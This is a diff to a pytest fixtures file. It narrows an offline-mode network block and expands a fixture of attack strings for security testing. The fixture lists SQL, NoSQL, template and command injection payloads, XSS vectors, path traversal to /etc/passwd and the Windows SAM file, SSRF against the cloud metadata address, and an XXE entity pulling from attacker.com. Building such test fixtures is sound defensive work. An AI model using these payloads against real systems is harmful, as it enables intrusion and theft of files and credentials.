@@ -266,13 +266,32 @@ def capture_logs(tmp_path: Path) -> Generator[Path, None, None]:
 
 @pytest.fixture
 def offline_mode(monkeypatch: pytest.MonkeyPatch) -> None:
-    """Simulate offline mode by blocking network access."""
-    import socket
+    """Simulate offline mode by blocking HTTP/HTTPS requests.
     
-    def _block_socket(*args, **kwargs):
-        raise OSError("Network access blocked in test")
+    Uses targeted patching of urllib and requests instead of blocking
+    all sockets, which could interfere with other test functionality.
+    """
+    try:
+        import urllib.request
+        
+        def _block_urlopen(*args, **kwargs):
+            raise OSError("Network access blocked in test (urlopen)")
+        
+        monkeypatch.setattr(urllib.request, "urlopen", _block_urlopen)
+    except ImportError:
+        pass
     
-    monkeypatch.setattr(socket, "socket", _block_socket)
+    try:
+        import requests
+        
+        def _block_requests(*args, **kwargs):
+            raise OSError("Network access blocked in test (requests)")
+        
+        monkeypatch.setattr(requests, "request", _block_requests)
+        monkeypatch.setattr(requests, "get", _block_requests)
+        monkeypatch.setattr(requests, "post", _block_requests)
+    except ImportError:
+        pass
 
 
 # =============================================================================
@@ -308,15 +327,59 @@ def sample_jwt_token() -> str:
 
 
 @pytest.fixture
-def malicious_inputs() -> list[str]:
-    """Return a list of malicious inputs for security testing."""
-    return [
-        "'; DROP TABLE users; --",  # SQL injection
-        "<script>alert('xss')</script>",  # XSS
-        "../../../etc/passwd",  # Path traversal
-        "{{constructor.constructor('return this')()}}",  # Template injection
-        "${7*7}",  # Expression injection
-    ]
+def malicious_inputs() -> dict[str, list[str]]:
+    """Return a categorized dictionary of malicious inputs for security testing.
+    
+    Categories include SQL injection, XSS, path traversal, NoSQL injection,
+    XXE, SSRF, and other common attack vectors.
+    """
+    return {
+        "sql_injection": [
+            "'; DROP TABLE users; --",
+            "1 OR 1=1",
+            "1; UPDATE users SET role='admin'",
+            "UNION SELECT * FROM passwords",
+        ],
+        "xss": [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')",
+            "<svg onload=alert('xss')>",
+        ],
+        "path_traversal": [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "%2e%2e%2f%2e%2e%2f",
+            "....//....//....//etc/passwd",
+        ],
+        "template_injection": [
+            "{{constructor.constructor('return this')()}}",
+            "${7*7}",
+            "{{config.items()}}",
+            "#{7*7}",
+        ],
+        "nosql_injection": [
+            '{"$ne": null}',
+            '{"$gt": ""}',
+            '{"$where": "this.password == this.passwordConfirm"}',
+        ],
+        "xxe": [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>',
+        ],
+        "ssrf": [
+            "http://127.0.0.1:22",
+            "http://localhost/admin",
+            "http://169.254.169.254/latest/meta-data/",
+            "file:///etc/passwd",
+        ],
+        "command_injection": [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "`id`",
+            "$(whoami)",
+        ],
+    }
 
 
 # =============================================================================
